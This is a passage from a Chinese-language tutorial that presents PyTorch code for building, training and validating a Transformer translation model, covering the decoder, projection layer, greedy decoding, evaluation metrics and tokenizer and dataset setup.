<h3 id="完整解码器（Decoder）"><a href="#完整解码器（Decoder）" class="headerlink" title="完整解码器（Decoder）"></a>完整解码器（Decoder）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Decoder</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;完整解码器（N层解码器块堆叠）&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, layers: nn.ModuleList</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.layers = layers</span><br><span class="line">        <span class="variable language_">self</span>.norm = LayerNormalization(features)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, encoder_output, src_mask, tgt_mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;逐层处理输入&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="variable language_">self</span>.layers:</span><br><span class="line">            x = layer(x, encoder_output, src_mask, tgt_mask)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.norm(x)</span><br></pre></td></tr></table></figure>

<h3 id="投影层（Projection-Layer）"><a href="#投影层（Projection-Layer）" class="headerlink" title="投影层（Projection Layer）"></a>投影层（Projection Layer）</h3><p><strong>功能说明</strong></p>
<p>将解码器的输出（d_model维）投影到词汇表空间（vocab_size维），用于预测下一个token。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ProjectionLayer</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;线性投影层：d_model → vocab_size&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model, vocab_size</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.proj = nn.Linear(d_model, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        输入: (batch, seq_len, d_model)</span></span><br><span class="line"><span class="string">        输出: (batch, seq_len, vocab_size)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.proj(x)</span><br></pre></td></tr></table></figure>

<h3 id="完整Transformer模型"><a href="#完整Transformer模型" class="headerlink" title="完整Transformer模型"></a>完整Transformer模型</h3><p><strong>模型组装</strong></p>
<p>将所有组件组装成完整的Transformer模型，包括编码器、解码器、嵌入层、位置编码和投影层。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;完整的Transformer模型&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, encoder: Encoder, decoder: Decoder, src_embed: InputEmbeddings, </span></span><br><span class="line"><span class="params">                 tgt_embed: InputEmbeddings, src_pos: PositionalEncoding, </span></span><br><span class="line"><span class="params">                 tgt_pos: PositionalEncoding, projection_layer: ProjectionLayer</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.encoder = encoder</span><br><span class="line">        <span class="variable language_">self</span>.decoder = decoder</span><br><span class="line">        <span class="variable language_">self</span>.src_embed = src_embed</span><br><span class="line">        <span class="variable language_">self</span>.tgt_embed = tgt_embed</span><br><span class="line">        <span class="variable language_">self</span>.src_pos = src_pos</span><br><span class="line">        <span class="variable language_">self</span>.tgt_pos = tgt_pos</span><br><span class="line">        <span class="variable language_">self</span>.projection_layer = projection_layer</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, src, src_mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;编码源序列&quot;&quot;&quot;</span></span><br><span class="line">        src = <span class="variable language_">self</span>.src_embed(src)</span><br><span class="line">        src = <span class="variable language_">self</span>.src_pos(src)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.encoder(src, src_mask)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, encoder_output: torch.Tensor, src_mask: torch.Tensor, </span></span><br><span class="line"><span class="params">               tgt: torch.Tensor, tgt_mask: torch.Tensor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;解码目标序列&quot;&quot;&quot;</span></span><br><span class="line">        tgt = <span class="variable language_">self</span>.tgt_embed(tgt)</span><br><span class="line">        tgt = <span class="variable language_">self</span>.tgt_pos(tgt)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.decoder(tgt, encoder_output, src_mask, tgt_mask)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">project</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;投影到词汇表空间&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.projection_layer(x)</span><br></pre></td></tr></table></figure>

<h3 id="模型构建函数"><a href="#模型构建函数" class="headerlink" title="模型构建函数"></a>模型构建函数</h3><p><strong>功能说明</strong></p>
<p>根据超参数构建完整的Transformer模型，并使用Xavier初始化参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_transformer</span>(<span class="params">src_vocab_size: <span class="built_in">int</span>, tgt_vocab_size: <span class="built_in">int</span>, src_seq_len: <span class="built_in">int</span>, </span></span><br><span class="line"><span class="params">                     tgt_seq_len: <span class="built_in">int</span>, d_model: <span class="built_in">int</span>=<span class="number">512</span>, N: <span class="built_in">int</span>=<span class="number">6</span>, h: <span class="built_in">int</span>=<span class="number">8</span>, </span></span><br><span class="line"><span class="params">                     dropout: <span class="built_in">float</span>=<span class="number">0.1</span>, d_ff: <span class="built_in">int</span>=<span class="number">2048</span></span>) -&gt; Transformer:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构建Transformer模型</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        src_vocab_size: 源语言词汇表大小</span></span><br><span class="line"><span class="string">        tgt_vocab_size: 目标语言词汇表大小</span></span><br><span class="line"><span class="string">        src_seq_len: 源序列最大长度</span></span><br><span class="line"><span class="string">        tgt_seq_len: 目标序列最大长度</span></span><br><span class="line"><span class="string">        d_model: 模型维度（默认512）</span></span><br><span class="line"><span class="string">        N: 编码器/解码器层数（默认6）</span></span><br><span class="line"><span class="string">        h: 注意力头数（默认8）</span></span><br><span class="line"><span class="string">        dropout: dropout概率（默认0.1）</span></span><br><span class="line"><span class="string">        d_ff: 前馈网络中间层维度（默认2048）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建嵌入层</span></span><br><span class="line">    src_embed = InputEmbeddings(d_model, src_vocab_size)</span><br><span class="line">    tgt_embed = InputEmbeddings(d_model, tgt_vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建位置编码层</span></span><br><span class="line">    src_pos = PositionalEncoding(d_model, src_seq_len, dropout)</span><br><span class="line">    tgt_pos = PositionalEncoding(d_model, tgt_seq_len, dropout)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建编码器块</span></span><br><span class="line">    encoder_blocks = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        encoder_self_attention_block = MultiHeadAttentionBlock(d_model, h, dropout)</span><br><span class="line">        feed_forward_block = FeedForwardBlock(d_model, d_ff, dropout)</span><br><span class="line">        encoder_block = EncoderBlock(d_model, encoder_self_attention_block, feed_forward_block, dropout)</span><br><span class="line">        encoder_blocks.append(encoder_block)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建解码器块</span></span><br><span class="line">    decoder_blocks = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        decoder_self_attention_block = MultiHeadAttentionBlock(d_model, h, dropout)</span><br><span class="line">        decoder_cross_attention_block = MultiHeadAttentionBlock(d_model, h, dropout)</span><br><span class="line">        feed_forward_block = FeedForwardBlock(d_model, d_ff, dropout)</span><br><span class="line">        decoder_block = DecoderBlock(d_model, decoder_self_attention_block, decoder_cross_attention_block, feed_forward_block, dropout)</span><br><span class="line">        decoder_blocks.append(decoder_block)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建编码器和解码器</span></span><br><span class="line">    encoder = Encoder(d_model, nn.ModuleList(encoder_blocks))</span><br><span class="line">    decoder = Decoder(d_model, nn.ModuleList(decoder_blocks))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建投影层</span></span><br><span class="line">    projection_layer = ProjectionLayer(d_model, tgt_vocab_size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组装Transformer</span></span><br><span class="line">    transformer = Transformer(encoder, decoder, src_embed, tgt_embed, src_pos, tgt_pos, projection_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用Xavier均匀初始化参数</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> transformer.parameters():</span><br><span class="line">        <span class="keyword">if</span> p.dim() &gt; <span class="number">1</span>:</span><br><span class="line">            nn.init.xavier_uniform_(p)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> transformer</span><br></pre></td></tr></table></figure>

<h2 id="Transformer训练实现"><a href="#Transformer训练实现" class="headerlink" title="Transformer训练实现"></a>Transformer训练实现</h2><p>本节介绍如何训练Transformer模型，包括数据加载、训练循环、验证和推理。</p>
<h3 id="导入依赖库"><a href="#导入依赖库" class="headerlink" title="导入依赖库"></a>导入依赖库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义模块</span></span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> build_transformer</span><br><span class="line"><span class="keyword">from</span> dataset <span class="keyword">import</span> BilingualDataset, causal_mask</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> get_config, get_weights_file_path, latest_weights_file_path</span><br><span class="line"></span><br><span class="line"><span class="comment"># PyTorch核心库</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader, random_split</span><br><span class="line"><span class="keyword">from</span> torch.optim.lr_scheduler <span class="keyword">import</span> LambdaLR</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据处理</span></span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"><span class="keyword">from</span> tokenizers <span class="keyword">import</span> Tokenizer</span><br><span class="line"><span class="keyword">from</span> tokenizers.models <span class="keyword">import</span> WordLevel</span><br><span class="line"><span class="keyword">from</span> tokenizers.trainers <span class="keyword">import</span> WordLevelTrainer</span><br><span class="line"><span class="keyword">from</span> tokenizers.pre_tokenizers <span class="keyword">import</span> Whitespace</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工具库</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> torchmetrics</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br></pre></td></tr></table></figure>

<h3 id="贪心解码函数"><a href="#贪心解码函数" class="headerlink" title="贪心解码函数"></a>贪心解码函数</h3><p><strong>功能说明</strong></p>
<p>在推理阶段使用贪心算法逐个生成目标序列的token，每次选择概率最高的token。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greedy_decode</span>(<span class="params">model, source, source_mask, tokenizer_src, tokenizer_tgt, max_len, device</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    贪心解码：逐token生成目标序列</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        model: 训练好的Transformer模型</span></span><br><span class="line"><span class="string">        source: 源序列 (已编码)</span></span><br><span class="line"><span class="string">        source_mask: 源序列掩码</span></span><br><span class="line"><span class="string">        tokenizer_src/tgt: 源/目标语言分词器</span></span><br><span class="line"><span class="string">        max_len: 生成序列最大长度</span></span><br><span class="line"><span class="string">        device: 计算设备</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        生成的目标序列 (token IDs)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sos_idx = tokenizer_tgt.token_to_id(<span class="string">&#x27;[SOS]&#x27;</span>)</span><br><span class="line">    eos_idx = tokenizer_tgt.token_to_id(<span class="string">&#x27;[EOS]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 预计算编码器输出（只需计算一次）</span></span><br><span class="line">    encoder_output = model.encode(source, source_mask)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化解码器输入为[SOS]</span></span><br><span class="line">    decoder_input = torch.empty(<span class="number">1</span>, <span class="number">1</span>).fill_(sos_idx).type_as(source).to(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自回归生成</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> decoder_input.size(<span class="number">1</span>) == max_len:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建因果掩码</span></span><br><span class="line">        decoder_mask = causal_mask(decoder_input.size(<span class="number">1</span>)).type_as(source_mask).to(device)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解码</span></span><br><span class="line">        out = model.decode(encoder_output, source_mask, decoder_input, decoder_mask)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 投影到词汇表并选择概率最高的token</span></span><br><span class="line">        prob = model.project(out[:, -<span class="number">1</span>])</span><br><span class="line">        _, next_word = torch.<span class="built_in">max</span>(prob, dim=<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将新token添加到序列</span></span><br><span class="line">        decoder_input = torch.cat([</span><br><span class="line">            decoder_input,</span><br><span class="line">            torch.empty(<span class="number">1</span>, <span class="number">1</span>).type_as(source).fill_(next_word.item()).to(device)</span><br><span class="line">        ], dim=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遇到EOS则停止</span></span><br><span class="line">        <span class="keyword">if</span> next_word == eos_idx:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoder_input.squeeze(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h3><p><strong>功能说明</strong></p>
<p>在验证集上评估模型性能，计算CER、WER和BLEU等指标。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_validation</span>(<span class="params">model, validation_ds, tokenizer_src, tokenizer_tgt, max_len, device, </span></span><br><span class="line"><span class="params">                  print_msg, global_step, writer, num_examples=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    运行模型验证</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        model: Transformer模型</span></span><br><span class="line"><span class="string">        validation_ds: 验证数据集</span></span><br><span class="line"><span class="string">        tokenizer_src/tgt: 分词器</span></span><br><span class="line"><span class="string">        max_len: 最大序列长度</span></span><br><span class="line"><span class="string">        device: 计算设备</span></span><br><span class="line"><span class="string">        print_msg: 打印函数</span></span><br><span class="line"><span class="string">        global_step: 当前训练步数</span></span><br><span class="line"><span class="string">        writer: TensorBoard写入器</span></span><br><span class="line"><span class="string">        num_examples: 验证样本数量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    source_texts = []</span><br><span class="line">    expected = []</span><br><span class="line">    predicted = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> os.popen(<span class="string">&#x27;stty size&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> console:</span><br><span class="line">            _, console_width = console.read().split()</span><br><span class="line">            console_width = <span class="built_in">int</span>(console_width)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        console_width = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> batch <span class="keyword">in</span> validation_ds:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            encoder_input = batch[<span class="string">&quot;encoder_input&quot;</span>].to(device)</span><br><span class="line">            encoder_mask = batch[<span class="string">&quot;encoder_mask&quot;</span>].to(device)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> encoder_input.size(<span class="number">0</span>) == <span class="number">1</span>, <span class="string">&quot;验证时batch_size必须为1&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 贪心解码生成预测</span></span><br><span class="line">            model_out = greedy_decode(model, encoder_input, encoder_mask, </span><br><span class="line">                                     tokenizer_src, tokenizer_tgt, max_len, device)</span><br><span class="line"></span><br><span class="line">            source_text = batch[<span class="string">&quot;src_text&quot;</span>][<span class="number">0</span>]</span><br><span class="line">            target_text = batch[<span class="string">&quot;tgt_text&quot;</span>][<span class="number">0</span>]</span><br><span class="line">            model_out_text = tokenizer_tgt.decode(model_out.detach().cpu().numpy())</span><br><span class="line"></span><br><span class="line">            source_texts.append(source_text)</span><br><span class="line">            expected.append(target_text)</span><br><span class="line">            predicted.append(model_out_text)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 打印示例</span></span><br><span class="line">            print_msg(<span class="string">&#x27;-&#x27;</span> * console_width)</span><br><span class="line">            print_msg(<span class="string">f&quot;<span class="subst">&#123;<span class="string">f&#x27;SOURCE: &#x27;</span>:&gt;<span class="number">12</span>&#125;</span><span class="subst">&#123;source_text&#125;</span>&quot;</span>)</span><br><span class="line">            print_msg(<span class="string">f&quot;<span class="subst">&#123;<span class="string">f&#x27;TARGET: &#x27;</span>:&gt;<span class="number">12</span>&#125;</span><span class="subst">&#123;target_text&#125;</span>&quot;</span>)</span><br><span class="line">            print_msg(<span class="string">f&quot;<span class="subst">&#123;<span class="string">f&#x27;PREDICTED: &#x27;</span>:&gt;<span class="number">12</span>&#125;</span><span class="subst">&#123;model_out_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> count == num_examples:</span><br><span class="line">                print_msg(<span class="string">&#x27;-&#x27;</span> * console_width)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算评估指标</span></span><br><span class="line">    <span class="keyword">if</span> writer:</span><br><span class="line">        <span class="comment"># 字符错误率</span></span><br><span class="line">        metric = torchmetrics.CharErrorRate()</span><br><span class="line">        cer = metric(predicted, expected)</span><br><span class="line">        writer.add_scalar(<span class="string">&#x27;validation cer&#x27;</span>, cer, global_step)</span><br><span class="line">        writer.flush()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 词错误率</span></span><br><span class="line">        metric = torchmetrics.WordErrorRate()</span><br><span class="line">        wer = metric(predicted, expected)</span><br><span class="line">        writer.add_scalar(<span class="string">&#x27;validation wer&#x27;</span>, wer, global_step)</span><br><span class="line">        writer.flush()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># BLEU分数</span></span><br><span class="line">        metric = torchmetrics.BLEUScore()</span><br><span class="line">        bleu = metric(predicted, expected)</span><br><span class="line">        writer.add_scalar(<span class="string">&#x27;validation BLEU&#x27;</span>, bleu, global_step)</span><br><span class="line">        writer.flush()</span><br></pre></td></tr></table></figure>

<h3 id="数据处理函数"><a href="#数据处理函数" class="headerlink" title="数据处理函数"></a>数据处理函数</h3><p><strong>获取句子生成器</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_sentences</span>(<span class="params">ds, lang</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从数据集提取指定语言的所有句子（生成器）</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        ds: 数据集对象</span></span><br><span class="line"><span class="string">        lang: 语言代码（如&#x27;en&#x27;, &#x27;fr&#x27;）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ds:</span><br><span class="line">        <span class="keyword">yield</span> item[<span class="string">&#x27;translation&#x27;</span>][lang]</span><br></pre></td></tr></table></figure>

<p><strong>构建或加载分词器</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_or_build_tokenizer</span>(<span class="params">config, ds, lang</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取或构建指定语言的分词器</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        config: 配置字典</span></span><br><span class="line"><span class="string">        ds: 数据集（用于训练分词器）</span></span><br><span class="line"><span class="string">        lang: 语言代码</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        Tokenizer对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tokenizer_path = Path(config[<span class="string">&#x27;tokenizer_file&#x27;</span>].<span class="built_in">format</span>(lang))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Path.exists(tokenizer_path):</span><br><span class="line">        <span class="comment"># 训练新分词器</span></span><br><span class="line">        tokenizer = Tokenizer(WordLevel(unk_token=<span class="string">&quot;[UNK]&quot;</span>))</span><br><span class="line">        tokenizer.pre_tokenizer = Whitespace()</span><br><span class="line">        trainer = WordLevelTrainer(</span><br><span class="line">            special_tokens=[<span class="string">&quot;[UNK]&quot;</span>, <span class="string">&quot;[PAD]&quot;</span>, <span class="string">&quot;[SOS]&quot;</span>, <span class="string">&quot;[EOS]&quot;</span>], </span><br><span class="line">            min_frequency=<span class="number">2</span></span><br><span class="line">        )</span><br><span class="line">        tokenizer.train_from_iterator(get_all_sentences(ds, lang), trainer=trainer)</span><br><span class="line">        tokenizer.save(<span class="built_in">str</span>(tokenizer_path))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 加载已有分词器</span></span><br><span class="line">        tokenizer = Tokenizer.from_file(<span class="built_in">str</span>(tokenizer_path))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tokenizer</span><br></pre></td></tr></table></figure>

<p><strong>加载并准备数据集</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_ds</span>(<span class="params">config</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    加载数据集并创建数据加载器</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        train_dataloader: 训练集加载器</span></span><br><span class="line"><span class="string">        val_dataloader: 验证集加载器</span></span><br><span class="line"><span class="string">        tokenizer_src: 源语言分词器</span></span><br><span class="line"><span class="string">        tokenizer_tgt: 目标语言分词器</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 加载原始数据集</span></span><br><span class="line">    ds_raw = load_dataset(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;datasource&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;lang_src&#x27;</span>]&#125;</span>-<span class="subst">&#123;config[<span class="string">&#x27;lang_tgt&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        split=<span class="string">&#x27;train&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建分词器</span></span><br><span class="line">    tokenizer_src = get_or_build_tokenizer(config, ds_raw, config[<span class="string">&#x27;lang_src&#x27;</span>])</span><br><span class="line">    tokenizer_tgt = get_or_build_tokenizer(config, ds_raw, config[<span class="string">&#x27;lang_tgt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 划分训练集和验证集（90%/10%）</span></span><br><span class="line">    train_ds_size = <span class="built_in">int</span>(<span class="number">0.9</span> * <span class="built_in">len</span>(ds_raw))</span><br><span class="line">    val_ds_size = <span class="built_in">len</span>(ds_raw) - train_ds_size</span><br><span class="line">    train_ds_raw, val_ds_raw = random_split(ds_raw, [train_ds_size, val_ds_size])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建BilingualDataset实例</span></span><br><span class="line">    train_ds = BilingualDataset(</span><br><span class="line">        train_ds_raw, tokenizer_src, tokenizer_tgt,</span><br><span class="line">        config[<span class="string">&#x27;lang_src&#x27;</span>], config[<span class="string">&#x27;lang_tgt&#x27;</span>], config[<span class="string">&#x27;seq_len&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    val_ds = BilingualDataset(</span><br><span class="line">        val_ds_raw, tokenizer_src, tokenizer_tgt,</span><br><span class="line">        config[<span class="string">&#x27;lang_src&#x27;</span>], config[<span class="string">&#x27;lang_tgt&#x27;</span>], config[<span class="string">&#x27;seq_len&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 统计最大句子长度</span></span><br><span class="line">    max_len_src = <span class="number">0</span></span><br><span class="line">    max_len_tgt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ds_raw:</span><br><span class="line">        src_ids = tokenizer_src.encode(item[<span class="string">&#x27;translation&#x27;</span>][config[<span class="string">&#x27;lang_src&#x27;</span>]]).ids</span><br><span class="line">        tgt_ids = tokenizer_tgt.encode(item[<span class="string">&#x27;translation&#x27;</span>][config[<span class="string">&#x27;lang_tgt&#x27;</span>]]).ids</span><br><span class="line">        max_len_src = <span class="built_in">max</span>(max_len_src, <span class="built_in">len</span>(src_ids))</span><br><span class="line">        max_len_tgt = <span class="built_in">max</span>(max_len_tgt, <span class="built_in">len</span>(tgt_ids))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;源语言最大长度: <span class="subst">&#123;max_len_src&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;目标语言最大长度: <span class="subst">&#123;max_len_tgt&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建数据加载器</span></span><br><span class="line">    train_dataloader = DataLoader(train_ds, batch_size=config[<span class="string">&#x27;batch_size&#x27;</span>], shuffle=<span class="literal">True</span>)</span><br><span class="line">    val_dataloader = DataLoader(val_ds, batch_size=<span class="number">1</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> train_dataloader, val_dataloader, tokenizer_src, tokenizer_tgt</span><br></pre></td></tr></table></figure>

<p><strong>构建模型</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_model</span>(<span class="params">config, vocab_src_len, vocab_tgt_len</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构建Transformer模型</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        config: 配置字典</span></span><br><span class="line"><span class="string">        vocab_src_len: 源语言词汇表大小</span></span><br><span class="line"><span class="string">        vocab_tgt_len: 目标语言词汇表大小</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    model = build_transformer(</span><br><span class="line">        vocab_src_len, vocab_tgt_len,</span><br><span class="line">        config[<span class="string">&quot;seq_len&quot;</span>], config[<span class="string">&#x27;seq_len&#x27;</span>],</span><br><span class="line">        d_model=config[<span class="string">&#x27;d_model&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure>

